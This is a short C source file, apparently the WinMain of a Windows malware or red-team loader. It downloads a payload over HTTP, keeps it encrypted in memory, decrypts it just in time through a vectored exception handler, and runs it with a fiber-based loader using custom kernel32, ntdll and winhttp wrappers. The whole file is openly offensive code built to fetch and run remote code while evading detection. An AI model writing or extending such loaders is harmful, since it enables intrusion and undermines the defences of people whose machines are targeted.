#include "lucky_cipher.h"
#include "lucky_fiber_loader.h"
#include "lucky_http.h"
#include "lucky_jitd.h"
#include "my_kernel32.h"
#include "my_ntdll.h"
#include "my_winhttp.h"
#include <stdio.h>


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
  initLuckyCipher();
  size_t size = 0;
  unsigned char *data = DownloadAndEncryptBytes(&size);

  if (!data || !size)
    return 0;

  MyAddVectoredExceptionHandler(1, JITDecryptVEH);

  Loader *loader = newLoader(data, size);

  LuckyRun(loader);

  return 0;
}